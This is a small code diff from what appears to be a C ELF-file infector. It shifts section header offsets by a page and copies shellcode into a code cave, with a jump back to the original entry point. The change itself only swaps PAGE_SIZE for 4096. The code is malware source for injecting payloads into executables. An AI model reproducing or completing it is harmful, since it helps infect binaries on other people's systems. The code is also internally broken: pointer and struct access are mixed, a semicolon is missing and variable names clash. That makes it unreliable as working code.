@@ -99,7 +99,7 @@ address=file_buffer+ehdr->e_shoff;
 	for ( i = 0; i < ehdr.e_shnum; i++) {
 		struct Elf32_Shdr shdr = (struct Elf32_Shdr*)address;
 		if (shdr->sh_offset >= offset) {
-			shdr->sh_offset += PAGE_SIZE;
+			shdr->sh_offset += 4096;
 		                                } 
 		else if (shdr->sh_addr + shdr->sh_size == evaddr) {
 			if (shdr->sh_type != SHT_PROGBITS) return -1;
@@ -110,7 +110,7 @@ address=file_buffer+ehdr->e_shoff;
 		address+=shdr->sh_size;
 	}
 	if (ehdr.e_shoff >= x) 
-	ehdr.e_shoff += PAGE_SIZE;
+	ehdr.e_shoff += 4096;
 	  char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,oryginal_entry,0) 
 memcpy(file_buffer+x,shellcodefixed,sclen);
   fseek(f,0,SEEK_SET);
